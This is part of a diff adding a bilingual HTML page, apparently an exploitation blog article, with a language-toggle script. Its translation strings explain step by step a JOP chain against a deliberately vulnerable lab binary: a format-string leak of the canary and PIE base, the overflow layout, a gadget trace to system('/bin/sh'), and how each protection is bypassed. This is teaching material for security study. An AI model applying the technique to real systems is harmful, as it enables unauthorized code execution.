+                art_p22: "The binary contains a constructor (<code>__attribute__((constructor))</code>) which runs automatically <em>before</em> <code>main()</code>, even before the program is visible to the user. This constructor calls <code>system(\"/bin/true\")</code>, a harmless command, but its side effect is decisive: it forces the resolution of <code>system</code> in the PLT/GOT right from the start. Even with Full RELRO, the real address of <code>system</code> is thus accessible via <code>elf.sym[\"system\"]</code> from the very beginning of the exploitation.",
+                art_h3_7_4: "The binary's JOP gadgets",
+                art_p23: "Two <code>naked</code> functions are defined in pure assembly in the binary without prologue or epilogue generated by the compiler. Every instruction written is exactly what executes. These two gadgets form the entirety of the JOP chain.",
+                art_p24: "<strong>g1</strong> is the loader gadget: it pops the next value on the stack with <code>pop r12</code>, places the address of <code>system</code> there, then jumps to it immediately with <code>jmp *r12</code>. It acts as the initiator of the chain.",
+                art_p25: "<strong>g2</strong> is the argument gadget: it loads <code>rdi</code>, which is the first argument in the AMD64 System V calling convention, with the address of the <code>/bin/sh</code> string, then jumps to <code>r12</code> which still contains the address of <code>system</code>. The effective call is therefore <code>system(\"/bin/sh\")</code>. <code>r12</code> is callee-saved: it has retained its value across all previous gadgets.",
+                art_h3_7_5: "Stage 1: Info leak via format string",
+                art_p26: "The format string vulnerability in <code>leak()</code> allows us to read arbitrary values on the stack using positional specifiers like <code>%15$p</code>. By sending the right format string, we extract two essential elements: the SSP canary and an address in the binary's code segment that will allow us to calculate the PIE base.",
+                art_h3_7_6: "Stage 2: JOP payload construction",
+                art_p27: "The buffer overflow in <code>vuln()</code> allows us to overwrite the stack beyond the 64-byte buffer. The memory layout of the frame is as follows, we must reach the return address while keeping the canary intact:",
+                art_mem_1: "Padding ('A' × 72) - buf[64] + 8 align",
+                art_mem_2: "CANARY (exact leaked value)",
+                art_mem_3: "bypass SSP",
+                art_mem_4: "Saved RBP ('B' × 8) - arbitrary value",
+                art_mem_5: "← ret jumps here → enters g1",
+                art_mem_6: "← g1 : pop r12 = system",
+                art_mem_7: "← on the stack when system resumes",
+                art_mem_8: "← g2 : pop rdi = &\"/bin/sh\"",
+                art_p28: "The complete exploitation script (pwntools) looks like this:",
+                art_h3_7_7: "Execution trace of the chain",
+                art_p29: "Here is exactly what happens during the execution of the payload, instruction by instruction:",
+                art_trace_1: "<strong>ret in vuln():</strong> RSP points to <code>addr(g1)</code>. The CPU loads this address and jumps to it. We enter g1.",
+                art_trace_2: "<strong>g1 : pop r12:</strong> the value at the top of the stack (<code>addr(system)</code>, +0x60) is loaded into <code>r12</code>. RSP advances to +0x68.",
+                art_trace_3: "<strong>g1 : jmp *r12:</strong> the CPU jumps to <code>system</code>. RSP points to +0x68 (<code>addr(g2)</code>). The stack is in this state when <code>system</code> begins to execute.",
+                art_trace_4: "<strong>system regains control of the stack:</strong> during its internal execution, <code>system</code> consumes RSP and eventually transfers control back to what the stack indicates. Here <code>addr(g2)</code>. We enter g2.",
+                art_trace_5: "<strong>g2 : pop rdi:</strong> the address of <code>\"/bin/sh\"</code> is loaded into <code>rdi</code>, the first argument according to the System V ABI.",
+                art_trace_6: "<strong>g2 : jmp *r12:</strong> <code>r12</code> is callee-saved and still contains <code>addr(system)</code>. The effective call is <code>system(\"/bin/sh\")</code>. The shell is obtained.",
+                art_bypass_title: "// BYPASSED PROTECTIONS SUMMARY",
+                art_bypass_nx: "no shellcode, only existing code in <code class=\"text-gray-300 text-[11px]\">.text</code>",
+                art_bypass_pie: "base calculated thanks to the format string leak",
+                art_bypass_ssp: "leaked value rewritten identically",
+                art_bypass_relro: "GOT never touched, direct call via leaked address",
+                art_bypass_shadow: "no <code>ret</code> in the JOP chain, invisible mechanism",
+                art_h2_8: "08 - References"
+            }
+        };
+
+        const langToggle = document.getElementById('lang-toggle');
+        let currentLang = localStorage.getItem('bugpwn_lang') || 'fr';
+
+        function updateLanguage(lang) {
+            currentLang = lang;
+            document.documentElement.lang = lang;
+            localStorage.setItem('bugpwn_lang', lang);
+            langToggle.innerText = lang === 'fr' ? 'EN' : 'FR';
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    el.innerHTML = translations[lang][key];
+                }
+            });
+        }
+
+        langToggle.addEventListener('click', () => {
+            const newLang = currentLang === 'fr' ? 'en' : 'fr';
+            updateLanguage(newLang);
+        });
+
+        updateLanguage(currentLang);
+    </script>
+</body>
+</html>
